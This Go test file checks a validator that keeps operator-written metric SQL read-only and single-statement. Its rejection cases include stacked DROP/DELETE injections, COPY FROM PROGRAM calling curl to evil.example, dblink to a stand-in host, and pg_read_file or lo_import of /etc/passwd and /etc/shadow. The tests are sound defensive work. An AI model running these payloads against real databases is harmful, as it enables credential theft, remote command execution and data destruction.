package metrics

import (
	"strings"
	"testing"
)

// A metric query is written by an operator, not by an agent, but it still runs
// against production data with whatever rights the sampler user has. These tests
// pin the guard that keeps a query readable-only and single-statement.

func TestValidateQueryAcceptsPlainSelect(t *testing.T) {
	// Arrange
	query := "SELECT coalesce(sum(amount), 0)::double precision FROM invoices WHERE status = 'paid'"

	// Act
	err := ValidateQuery(query)

	// Assert
	if err != nil {
		t.Fatalf("expected valid query, got error: %v", err)
	}
}

func TestValidateQueryAcceptsCTE(t *testing.T) {
	query := `WITH paid AS (
        SELECT amount FROM invoices WHERE status = 'paid'
    )
    SELECT coalesce(sum(amount), 0)::double precision FROM paid`

	if err := ValidateQuery(query); err != nil {
		t.Fatalf("expected CTE query to be valid, got: %v", err)
	}
}

func TestValidateQueryAcceptsTrailingSemicolon(t *testing.T) {
	if err := ValidateQuery("SELECT count(*)::double precision FROM users;"); err != nil {
		t.Fatalf("expected trailing semicolon to be tolerated, got: %v", err)
	}
}

func TestValidateQueryAcceptsColumnsThatContainForbiddenWords(t *testing.T) {
	// deleted_at, offset and updated_by all embed words the guard forbids as
	// standalone statements. Word boundaries must keep them legal.
	query := "SELECT count(*)::double precision FROM users WHERE deleted_at IS NULL OFFSET 0"

	if err := ValidateQuery(query); err != nil {
		t.Fatalf("expected embedded keywords to be allowed, got: %v", err)
	}
}

func TestValidateQueryRejectsEmptyQuery(t *testing.T) {
	for _, query := range []string{"", "   ", "\n\t"} {
		if err := ValidateQuery(query); err == nil {
			t.Fatalf("expected error for blank query %q", query)
		}
	}
}

func TestValidateQueryRejectsNonSelectStart(t *testing.T) {
	cases := map[string]string{
		"update":       "UPDATE users SET is_active = false",
		"delete":       "DELETE FROM users",
		"insert":       "INSERT INTO users (id) VALUES (1)",
		"drop":         "DROP TABLE users",
		"call":         "CALL do_something()",
		"do block":     "DO $$ BEGIN PERFORM 1; END $$",
		"copy program": "COPY t FROM PROGRAM 'curl evil.example'",
		"set":          "SET ROLE postgres",
		"explain":      "EXPLAIN ANALYZE SELECT 1",
	}

	for name, query := range cases {
		t.Run(name, func(t *testing.T) {
			if err := ValidateQuery(query); err == nil {
				t.Fatalf("expected %s to be rejected", name)
			}
		})
	}
}

func TestValidateQueryRejectsStackedStatements(t *testing.T) {
	// The classic escalation: a legal SELECT followed by anything at all.
	cases := []string{
		"SELECT 1; DROP TABLE users",
		"SELECT 1;DELETE FROM users;",
		"SELECT 1; SELECT 2",
	}

	for _, query := range cases {
		if err := ValidateQuery(query); err == nil {
			t.Fatalf("expected stacked statement to be rejected: %q", query)
		}
	}
}

func TestValidateQueryRejectsWriteKeywordsAnywhere(t *testing.T) {
	cases := map[string]string{
		"cte with insert": "WITH x AS (INSERT INTO t VALUES (1) RETURNING id) SELECT id::double precision FROM x",
		"cte with update": "WITH x AS (UPDATE t SET a = 1 RETURNING id) SELECT id::double precision FROM x",
		"cte with delete": "WITH x AS (DELETE FROM t RETURNING id) SELECT id::double precision FROM x",
		"truncate":        "SELECT 1 FROM (TRUNCATE t) x",
		"grant":           "SELECT 1 WHERE (GRANT ALL ON t TO public)",
	}

	for name, query := range cases {
		t.Run(name, func(t *testing.T) {
			if err := ValidateQuery(query); err == nil {
				t.Fatalf("expected %s to be rejected", name)
			}
		})
	}
}

func TestValidateQueryRejectsFilesystemAndNetworkFunctions(t *testing.T) {
	cases := map[string]string{
		"read file":  "SELECT pg_read_file('/etc/passwd')",
		"ls dir":     "SELECT pg_ls_dir('/')",
		"large obj":  "SELECT lo_import('/etc/shadow')",
		"dblink":     "SELECT dblink('host=evil.example', 'select 1')",
		"sleep":      "SELECT pg_sleep(600)",
		"terminate":  "SELECT pg_terminate_backend(1)",
		"settings":   "SELECT current_setting('is_superuser')",
		"pg_authid":  "SELECT count(*)::double precision FROM pg_authid",
		"pg_shadow":  "SELECT count(*)::double precision FROM pg_shadow",
		"user table": "SELECT count(*)::double precision FROM pg_user",
	}

	for name, query := range cases {
		t.Run(name, func(t *testing.T) {
			if err := ValidateQuery(query); err == nil {
				t.Fatalf("expected %s to be rejected", name)
			}
		})
	}
}

func TestValidateQueryRejectsComments(t *testing.T) {
	// Comments are the standard way to hide a payload from a naive scanner, and
	// an operator-authored metric query has no need for them.
	cases := []string{
		"SELECT 1 -- ; DROP TABLE users",
		"SELECT /* sneaky */ 1",
		"SELECT 1 /* unterminated",
	}

	for _, query := range cases {
		if err := ValidateQuery(query); err == nil {
			t.Fatalf("expected comment to be rejected: %q", query)
		}
	}
}

func TestValidateQueryRejectsOversizedQuery(t *testing.T) {
	query := "SELECT 1 FROM t WHERE a IN (" + strings.Repeat("1,", maxQueryLength) + "1)"

	if err := ValidateQuery(query); err == nil {
		t.Fatal("expected oversized query to be rejected")
	}
}

func TestValidateQueryErrorsAreDescriptive(t *testing.T) {
	// The operator reads these at boot; a bare "invalid" would waste their time.
	err := ValidateQuery("DELETE FROM users")
	if err == nil {
		t.Fatal("expected error")
	}
	if !strings.Contains(err.Error(), "SELECT") && !strings.Contains(err.Error(), "select") {
		t.Fatalf("expected error to explain the SELECT requirement, got: %v", err)
	}
}
